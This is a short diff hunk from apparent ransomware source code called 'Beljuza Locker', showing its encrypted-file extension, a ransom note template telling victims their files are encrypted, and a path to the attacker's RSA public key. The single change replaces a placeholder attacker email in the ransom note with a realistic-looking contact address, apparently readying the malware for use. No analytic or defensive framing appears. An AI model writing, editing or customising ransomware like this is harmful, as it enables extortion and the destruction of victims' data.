@@ -20,7 +20,7 @@ RANSOM_EXTENSION = '.beljuza'
 RANSOM_NOTE = """
 ---=== Beljuza Locker ===---
 Your important files have been encrypted!
-Contact: attacker@evilmail.com
+Contact: beljuza@bejuza.com
 Victim ID: {victim_id}
 """
 PUBLIC_KEY_PATH = 'public.pem'  # Path to attacker's RSA public key
